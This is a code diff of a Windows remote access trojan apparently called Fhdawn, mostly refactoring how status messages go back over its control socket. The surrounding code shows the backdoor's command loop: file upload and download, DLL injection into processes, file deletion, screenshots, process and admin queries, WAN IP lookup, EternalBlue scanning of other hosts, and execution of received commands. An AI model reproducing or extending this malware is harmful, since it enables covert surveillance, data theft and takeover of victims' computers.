@@ -19,17 +19,22 @@ int fsize = 0;
 char* fileinfo[3];
 char temp[BUFFER]; // Temporary buffer to receive file information
 
+
+// Declare local, PAss parameter
+struct sockaddr_in server;
+SOCKET sockfd;
+
 TOKEN_PRIVILEGES priv = { 0 };
 HANDLE hModule = NULL;
 HANDLE hProcess = NULL;
 HANDLE hToken = NULL;
 
 
-#define BREAK_WITH_ERROR( e ) { sockprintf(sockfd, "[-] %s. Error=%ld", e, GetLastError() ); break; }
+#define BREAK_WITH_ERROR( e ) { sockprintf( "[-] %s. Error=%ld", e, GetLastError() ); break; }
 
 
 // By @augustgl (github.com/augustgl)
-void sockprintf(SOCKET sock, const char* words, ...) {
+void sockprintf(const char* words, ...) {
     static char textBuffer[BUFFER];
     memset(textBuffer, '\0', BUFFER);
     va_list args;
@@ -54,7 +59,7 @@ void sockSend(const char* data)
     int totalsent = 0;
     int buflen = strlen(data);
     while (buflen > totalsent) {
-        int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
+        int r = send( sockfd, data + totalsent, buflen - totalsent, 0);
         if (lerror == WSAECONNRESET)
         {
             connected = FALSE;
@@ -70,7 +75,7 @@ void fhdawn_main(void)
     while (connected)
     {
         memset(recvbuf, '\0', BUFFER);
-        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+        int return_code = recv(sockfd,  recvbuf, BUFFER, 0);
         if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
         {
             connected = FALSE;
@@ -95,7 +100,7 @@ void fhdawn_main(void)
             {
                 connected = FALSE;
             }
-            sockprintf(sockfd, "%s - %s", recvbuf, IP2Host(recvbuf));
+            sockprintf( "%s - %s", recvbuf, IP2Host(recvbuf));
         }
 
         else if(strcmp(recvbuf, "checkport") == 0)
@@ -129,7 +134,7 @@ void fhdawn_main(void)
             // Create file.
             HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
             if (recvfile == INVALID_HANDLE_VALUE) {
-                sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
+                sockprintf( "[Error Creating File] : %ld", GetLastError());
             }
             else {
                 memset(recvbuf, '\0', BUFFER); // Clear main buffer
@@ -153,13 +158,13 @@ void fhdawn_main(void)
 
                 if (write == FALSE)
                 {
-                    sockprintf(sockfd, "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
+                    sockprintf( "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                 }
                 else {
-                    // sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
-                    // sockprintf(sockfd, "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
+                    // sockprintf( "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                    // sockprintf( "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
                     sockprintf(
-                        sockfd,
+                        
                         "F_OK,%s,%i,%s\\%s",
                         fileinfo[0],
                         total,
@@ -226,7 +231,7 @@ void fhdawn_main(void)
                     BREAK_WITH_ERROR("Failed to inject the DLL");
 
                 WaitForSingleObject(hModule, -1);
-                sockprintf(sockfd, "DLL_OK:%ld", dwProcessId);
+                sockprintf( "DLL_OK:%ld", dwProcessId);
             } while (0);
 
             if (DLL)
@@ -255,7 +260,7 @@ void fhdawn_main(void)
                 for (int i = 0; i < 2; i++) {
                     if (*fileinfo[i] == '\0')
                     {
-                        sockprintf(sockfd, "[ Invalid File Download Request ]\n");
+                        sockprintf( "[ Invalid File Download Request ]\n");
                         upload = FALSE;
                         break;
                     }
@@ -271,13 +276,13 @@ void fhdawn_main(void)
                         fseek(fs, 0, SEEK_SET);
 
                         if(filesize <= 0){
-                            sockprintf(sockfd, "File '%s' is of 0 bytes.", fileinfo[1]);
+                            sockprintf( "File '%s' is of 0 bytes.", fileinfo[1]);
                             fclose(fs);
                             upload = FALSE;
                             break;
                         }
 
-                        sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
+                        sockprintf( "FILE:%s:%ld", fileinfo[1], filesize);
                         Sleep(1000);
                         char fbuffer[500];
                         memset(fbuffer, '\0', 500);
@@ -294,7 +299,7 @@ void fhdawn_main(void)
                     }
 
                     else {
-                        sockprintf(sockfd, "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
+                        sockprintf( "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
                     }
                 }
                 // important
@@ -357,21 +362,21 @@ void fhdawn_main(void)
                 // on line 22 I'm using %ld to print the error, it works, What??
                 switch (x) {
                 case 2:
-                    sockprintf(sockfd, "Error Changing Directory, File or Folder not Found (Error code %i)", x);
+                    sockprintf( "Error Changing Directory, File or Folder not Found (Error code %i)", x);
                     break;
                 case 3:
-                    sockprintf(sockfd, "Error Changing Directory, Path not found (Error Code %i)", x);
+                    sockprintf( "Error Changing Directory, Path not found (Error Code %i)", x);
                     break;
                 case 5:
-                    sockprintf(sockfd, "Error Changing Directory, Access Denied (Error Code %i)", x);
+                    sockprintf( "Error Changing Directory, Access Denied (Error Code %i)", x);
                     break;
                 default:
-                    sockprintf(sockfd, "Error Changing Directory, Error %i", x);
+                    sockprintf( "Error Changing Directory, Error %i", x);
                     break;
                 }  
             }
             else {
-                sockprintf(sockfd, "Directory Changed to '%s'", cDir());
+                sockprintf( "Directory Changed to '%s'", cDir());
             }
         } 
         
@@ -384,21 +389,21 @@ void fhdawn_main(void)
             {
                 if (DeleteFile(fileinfo[1]))
                 {
-                    sockprintf(sockfd, "DEL_OK,%s,%s", fileinfo[1], cDir());
+                    sockprintf( "DEL_OK,%s,%s", fileinfo[1], cDir());
                 }
                 else {
-                    sockprintf(sockfd, "Error Deleting file : %i", GetLastError());
+                    sockprintf( "Error Deleting file : %i", GetLastError());
                 }
                 
             }
             else {
-                sockprintf(sockfd, "File '%s' does not exist.", fileinfo[1]);
+                sockprintf( "File '%s' does not exist.", fileinfo[1]);
             }
         }
 
         // Capture screenshot
         else if (strcmp(recvbuf, "screenshot") == 0) {
-            CaptureAnImage(GetDesktopWindow());
+            CaptureAnImage(GetDesktopWindow(), sockfd);
         }
         
         // Send process info
@@ -417,19 +422,19 @@ void fhdawn_main(void)
                     if (GetModuleFileNameEx(procHandle, NULL, FILEPATH, MAX_PATH) != 0)
                     {
                         // Send Process name, pid, and path back
-                        sockprintf(sockfd, "PROCESS,%s,%ld,%s", fileinfo[1], pid, FILEPATH);
+                        sockprintf( "PROCESS,%s,%ld,%s", fileinfo[1], pid, FILEPATH);
                     }
                     else {
-                        sockprintf(sockfd, "PROCESS,%s,%ld,(error : %ld)", fileinfo[1], pid, GetLastError());
+                        sockprintf( "PROCESS,%s,%ld,(error : %ld)", fileinfo[1], pid, GetLastError());
                     }
                     CloseHandle(procHandle);
                 }
                 else {
-                    sockprintf(sockfd, "Failed to open Process : %s", fileinfo[1]);
+                    sockprintf( "Failed to open Process : %s", fileinfo[1]);
                 }
             }
             else {
-                sockprintf(sockfd, "Process not running.");
+                sockprintf( "Process not running.");
             }
         }
 
@@ -439,10 +444,10 @@ void fhdawn_main(void)
         {
             if (IsAdmin())
             {
-                sockprintf(sockfd, "ADMIN:TRUE");
+                sockprintf( "ADMIN:TRUE");
             }
             else {
-                sockprintf(sockfd, "ADMIN:FALSE");
+                sockprintf( "ADMIN:FALSE");
             }
 
         } 
@@ -463,14 +468,14 @@ void fhdawn_main(void)
 
                 InternetCloseHandle(hFile);
                 InternetCloseHandle(hInternet);
-                sockprintf(sockfd, "WANIP:%s", wanip);
+                sockprintf( "WANIP:%s", wanip);
             } else {
-                sockprintf(sockfd, "No Internet Connection detected ...");
+                sockprintf( "No Internet Connection detected ...");
             }
         }
 
         else if (strcmp(recvbuf, "fhdawnpid") == 0){
-            sockprintf(sockfd, "FHDAWNPID:%s", FhdawnInfo());
+            sockprintf( "FHDAWNPID:%s", FhdawnInfo());
         }
 
         else if (strstr(recvbuf, "eternal_scan") != NULL) // eternal_scan:192.168.0.109
@@ -480,7 +485,7 @@ void fhdawn_main(void)
             EternalBlueScan(fileinfo[1]); 
         }
         else {
-            ExecSock();
+            ExecSock(sockfd);
         }
 
     }
